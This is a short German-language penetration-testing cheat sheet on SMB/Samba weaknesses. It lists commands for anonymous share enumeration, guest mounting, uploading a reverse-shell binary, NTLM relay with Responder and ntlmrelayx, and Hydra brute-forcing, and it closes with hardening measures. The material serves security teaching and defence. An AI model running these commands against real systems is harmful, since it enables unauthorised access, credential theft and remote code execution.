# SMB (Samba)

### **Einleitung**

Das **SMB-Protokoll** (Server Message Block) wird für Datei- und Druckfreigaben verwendet, insbesondere in Windows-Netzwerken (Samba unter Linux). Fehlkonfigurationen wie anonyme Freigaben oder schwache Berechtigungen erlauben oft unautorisierten Zugriff auf sensible Daten oder können für das Ablegen und Ausführen von schädlichem Code genutzt werden.

***

### **Typische Angriffspunkte**

#### **1. Auflistung verfügbarer Freigaben (enum)**

Ohne Authentifizierung:

```bash
smbclient -L //<target-ip> -N
```

Mit Authentifizierung:

```bash
smbclient -L //<target-ip> -U username
```

***

#### **2. Zugriff auf Freigaben**

Wenn eine Freigabe ohne Authentifizierung zugänglich ist (z. B. `anonymous`, `guest`, `Everyone`), kann sie direkt gemountet oder mit dem `smbclient` angesprochen werden:

```bash
smbclient //<target-ip>/sharename -N
```

Oder mounten (unter Linux):

```bash
sudo mount -t cifs //<target-ip>/sharename /mnt/smb -o guest
```

***

#### **3. Ablegen und Ausführen von Payloads**

Wenn Schreibzugriff besteht, kann ein Angreifer z. B. eine Reverse-Shell oder Backdoor auf dem System platzieren – besonders gefährlich bei ausführbaren Freigaben (z. B. `netlogon`, `scripts`, `public`).

```bash
put reverse.exe
```

***

#### **4. NTLM-Hash-Angriffe über SMB-Relay**

Angreifer können den SMB-Traffic manipulieren (z. B. mit Responder oder ntlmrelayx):

```bash
responder -I eth0
ntlmrelayx -t smb://<target> --no-smb-server
```

***

#### **5. Brute-Force / Password Spraying**

```bash
hydra -L users.txt -P passwords.txt smb://<target-ip>
```

***

### **Sicherheitsmaßnahmen**

* Deaktivieren anonymer oder Gast-Zugriffe
* Berechtigungen restriktiv setzen
* SMBv1 deaktivieren
* Logging aktivieren (z. B. `/var/log/samba/`)
* Netzwerksegmentierung & Firewall-Regeln
